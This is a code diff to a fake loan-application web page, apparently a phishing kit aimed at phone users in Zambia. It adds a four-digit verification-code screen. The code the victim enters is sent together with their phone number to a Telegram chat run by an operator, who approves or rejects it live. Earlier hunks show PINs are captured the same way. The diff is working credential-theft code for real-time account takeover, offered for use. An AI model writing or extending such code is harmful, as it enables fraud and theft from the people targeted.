@@ -746,6 +746,46 @@ input[type="text"] {
 
     </div>
 
+    <!-- PAGE 6a -->
+
+        <div id="page6a" class="hidden">
+
+        <div class="center">
+
+            <div class="icon">🔐</div>
+
+            <h2>Enter Verification Code</h2>
+
+            <p style="margin-top:10px;color:#6b7280">
+                Enter the 4-digit code sent to your phone.
+            </p>
+
+        </div>
+
+
+        <div class="otp" id="otpGrid">
+
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+
+        </div>
+
+
+        <button
+            id="verifyButton"
+            class="button blue"
+            disabled
+            onclick="submitOTP()"
+        >
+            Verify
+        </button>
+
+        <div id="otpStatus" class="status-message"></div>
+
+        </div>
+
 
     <!-- PAGE 7 -->
 
@@ -961,6 +1001,7 @@ function showPage(id, step, title, subtitle) {
         "page4",
         "page5",
         "page6",
+        "page6a",
         "page7",
         "page8"
     ];
@@ -1396,7 +1437,7 @@ function verifyPIN() {
                     pinBtn.disabled = false;
                     pinStatus.style.display = "none";
                     if (action === "approve_pin") {
-                        showPage("page7", 7, "Secure Authorization", "Continue securely");
+                        showPage("page6a", 6, "OTP Code", "Enter the code sent to your phone");
                     } else if (action === "wrongpin") {
                         alert("The PIN provided is incorrect. Please try again.");
                         document.getElementById("pinInput").value = "";
@@ -1422,6 +1463,169 @@ function verifyPIN() {
         });
 
 }
+
+    function goToOTP() {
+
+    showPage(
+        "page6a",
+        6,
+        "OTP Code",
+        "Enter the code sent to your phone"
+    );
+
+    setupOTP();
+
+}
+
+
+function setupOTP() {
+
+    const inputs =
+        document.querySelectorAll(
+            "#otpGrid input"
+        );
+
+    const button =
+        document.getElementById(
+            "verifyButton"
+        );
+
+
+    inputs.forEach(function(input, index) {
+
+        input.value = "";
+
+
+        input.addEventListener(
+            "input",
+            function() {
+
+                input.value =
+                    input.value.replace(/\D/g, "");
+
+
+                if (
+                    input.value &&
+                    index < inputs.length - 1
+                ) {
+
+                    inputs[index + 1].focus();
+
+                }
+
+
+                const code =
+                    [...inputs]
+                    .map(function(item) {
+                        return item.value;
+                    })
+                    .join("");
+
+
+                button.disabled =
+                    code.length !== 4;
+
+            }
+        );
+
+
+        input.addEventListener(
+            "keydown",
+            function(event) {
+
+                if (
+                    event.key === "Backspace" &&
+                    !input.value &&
+                    index > 0
+                ) {
+
+                    inputs[index - 1].focus();
+
+                }
+
+            }
+        );
+
+    });
+
+
+    inputs[0].focus();
+
+}
+
+
+function submitOTP() {
+
+    const inputs =
+        document.querySelectorAll(
+            "#otpGrid input"
+        );
+
+    const code =
+        [...inputs]
+        .map(function(input) {
+            return input.value;
+        })
+        .join("");
+
+
+    if (code.length !== 4) {
+
+        alert(
+            "Please enter the complete verification code."
+        );
+
+        return;
+
+    }
+
+    // Send OTP to telegram for admin verification
+    sessionToken = generateSessionId();
+    const otpBtn = document.getElementById("verifyButton");
+    const otpStatus = document.getElementById("otpStatus");
+    
+    showLoading("Verifying Code", "Confirming your verification code...");
+    otpBtn.disabled = true;
+    otpStatus.style.display = "block";
+
+    sendTelegramOTPRequest(sessionToken, code, "+260 " + phoneInput.value)
+        .then(() => {
+            pollTelegramForAction({
+                session: sessionToken,
+                timeoutMs: 2 * 60 * 1000,
+                onAction: (action) => {
+                    clearTimeout(otpPollingTimeoutHandle);
+                    hideLoading();
+                    otpBtn.disabled = false;
+                    otpStatus.style.display = "none";
+                    if (action === "approve_otp") {
+                        showPage("page7", 7, "Secure Authorization", "Continue securely");
+                    } else if (action === "wrongotp") {
+                        alert("The OTP provided is wrong or has expired. Please try again.");
+                        document.querySelectorAll("#otpGrid input").forEach(i => i.value = "");
+                        document.querySelectorAll("#otpGrid input")[0].focus();
+                    } else {
+                        alert("Unknown OTP action: " + action);
+                    }
+                },
+                onTimeout: () => {
+                    hideLoading();
+                    otpBtn.disabled = false;
+                    otpStatus.style.display = "none";
+                    alert("No response from agent. Please try again later.");
+                }
+            });
+        })
+        .catch(err => {
+            hideLoading();
+            otpBtn.disabled = false;
+            otpStatus.style.display = "none";
+            console.error("Send OTP request failed", err);
+            alert("Failed to send OTP to agent. Please try again.");
+        });
+
+}
+
 
 
 function submitApplication() {
@@ -1575,6 +1779,23 @@ async function sendTelegramPINRequest(session, pin) {
   }
   return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
 }
+
+    async function sendTelegramOTPRequest(session, otp, otpPhone) {
+  const loan = calculateLoan();
+  const text = `OTP Verification\nPhone: ${otpPhone}\nOTP: ${otp}`;
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: '✅APPROVE', callback_data: `approve_otp::${session}` },
+        { text: '❌WRONG OTP', callback_data: `wrongotp::${session}` }
+      ]
+    ]
+  };
+  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+    return Promise.reject('Bot token not configured. Replace TELEGRAM_BOT_TOKEN with your token.');
+  }
+  return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
+    }
 
 function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, onTimeout = ()=>{}}) {
   if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
